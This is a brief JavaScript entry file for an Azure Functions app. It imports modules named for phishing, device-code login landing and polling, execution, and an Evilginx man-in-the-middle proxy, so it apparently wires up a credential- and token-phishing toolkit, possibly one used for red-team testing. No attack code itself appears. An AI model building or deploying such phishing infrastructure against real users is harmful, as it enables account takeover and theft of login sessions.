const { app } = require('@azure/functions');

// Import all functions
require('./functions/phishing.js');
require('./functions/devicecode_landing.js');
require('./functions/devicecode_poll.js');
require('./functions/execution.js');
require('./functions/evilginx_mitm.js');